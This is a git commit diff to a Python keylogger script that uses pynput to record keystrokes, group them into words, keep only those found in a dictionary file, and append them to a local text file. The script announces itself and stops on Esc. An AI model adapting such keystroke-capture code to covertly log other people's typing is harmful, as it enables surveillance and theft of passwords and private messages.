979ed788a14ba8c4715bc5a30f5072705e35c1f9
Phydon <84594612+Phydon@users.noreply.github.com>
2023-07-30 19:26:33 +0200

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -4,20 +4,33 @@ from pynput import keyboard
 
 
 FILEPATH = os.path.join(os.path.dirname(__file__), "keylog.txt")
-keys = []
+DICTIONARY_PATH = os.path.join(os.path.dirname(__file__), "dictionary.txt")
+words = []
 text = ""
 
 
-def write_to_file(filepath, keys):
+def load_words(dictionary_path):
+    with open(dictionary_path) as word_file:
+        valid_words = set(word_file.read().split())
+
+    return valid_words
+
+
+def word_in_dictionary(dictionary, word):
+    return True if word.strip().lower() in dictionary else False
+    
+
+
+def write_to_file(filepath, dictionary, words):
     try: 
         with open(filepath, "a") as writer:
-            for key in keys:
+            for word in words:
                 # FIXME filters out every word that contains special chars
                 # like "!", "?", """, etc.
-                if key.isalpha() and key.find("Key.") == -1:
-                    # TODO compare the word to a dictionary before adding to file
-                    writer.write(key)
-                    writer.write('\n')
+                if word.isalpha() and word.find("Key.") == -1:
+                    if word_in_dictionary(dictionary, word):
+                        writer.write(word)
+                        writer.write('\n')
 
             # FIXME -> needed?
             writer.truncate()
@@ -32,15 +45,15 @@ def on_press(key):
     except AttributeError:
         print(key)
         
-    global text, keys
+    global text, words
     if key == keyboard.Key.enter:
-        keys.append(text)
+        words.append(text)
         text = ""
     elif key == keyboard.Key.tab:
-        keys.append(text)
+        words.append(text)
         text = ""
     elif key == keyboard.Key.space:
-        keys.append(text)
+        words.append(text)
         text = ""
     elif key == keyboard.Key.shift:
         pass
@@ -51,7 +64,7 @@ def on_press(key):
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         pass
     elif key == keyboard.Key.esc:
-        keys.append(text)
+        words.append(text)
         text = ""
     else:
         text += str(key).strip("'")
@@ -59,26 +72,26 @@ def on_press(key):
     
 def on_release(key):
     if key == keyboard.Key.esc:
-        global keys
-        write_to_file(FILEPATH, keys)
-        keys = []
+        global words
+        print("Populating file ...")
+        write_to_file(FILEPATH, dictionary, words)
+        words = []
         
         # Stop listener
-        print("Stop logging keys")
+        print("Quitting")
         return False
-
-
-def log_key(): 
-    # Collect events until released
-    with keyboard.Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
-        listener.join()
 
 
 if __name__ == "__main__":
     try: 
+        print("Loading dictionary ...")
+        dictionary = load_words(DICTIONARY_PATH)
+        
         print("Logging keys ...")
-        log_key()
+        # Collect events until released
+        with keyboard.Listener(
+                on_press=on_press,
+                on_release=on_release) as listener:
+            listener.join()
     except KeyboardInterrupt:
         sys.exit()
